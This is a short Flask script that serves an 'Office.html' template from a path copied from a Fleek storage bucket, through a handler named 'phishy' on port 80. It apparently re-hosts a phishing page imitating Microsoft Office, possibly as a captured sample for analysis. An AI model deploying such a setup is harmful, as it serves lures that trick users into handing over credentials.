from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='storageapi-stg.fleek.co/6c5e0145-aee9-49fc-9228-08dde84ed78c-bucket/mm')

@app.route('/6c5e0145-aee9-49fc-9228-08dde84ed78c-bucket/mm/Office.html')
def phishy():
    return render_template('Office.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)